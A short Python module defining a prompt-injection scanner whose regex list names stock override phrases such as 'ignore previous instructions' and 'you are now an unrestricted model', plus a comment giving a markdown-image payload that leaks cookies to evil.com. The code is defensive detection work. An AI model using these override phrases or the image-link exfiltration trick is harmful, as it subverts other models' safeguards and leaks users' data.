import re


class PromptInjectionError(ValueError):
    """Exception raised when a potential prompt injection is detected."""

    pass


class PromptInjectionScanner:
    # Compile heuristics patterns for jailbreak detection
    PATTERNS = [
        re.compile(r"ignore\s+(?:the\s+)?prior\s+instructions", re.IGNORECASE),
        re.compile(r"ignore\s+(?:the\s+)?above\s+instructions", re.IGNORECASE),
        re.compile(r"ignore\s+(?:the\s+)?previous\s+instructions", re.IGNORECASE),
        re.compile(r"system\s+override", re.IGNORECASE),
        re.compile(r"you\s+are\s+now\s+an\s+unrestricted\s+model", re.IGNORECASE),
        re.compile(r"bypass\s+(?:the\s+)?safeguards", re.IGNORECASE),
        # Detect markdown image extraction injection attempts (e.g. ![leak](http://evil.com/cookie))
        re.compile(r"!\[.*\]\(http.*\)", re.IGNORECASE),
    ]

    @classmethod
    def scan_prompt(cls, prompt: str) -> None:
        """
        Scan a user prompt for potential prompt injection.
        Raises PromptInjectionError if a pattern matches.
        """
        if not prompt:
            return

        for pattern in cls.PATTERNS:
            if pattern.search(prompt):
                raise PromptInjectionError(
                    "Potential prompt injection or safety override detected."
                )
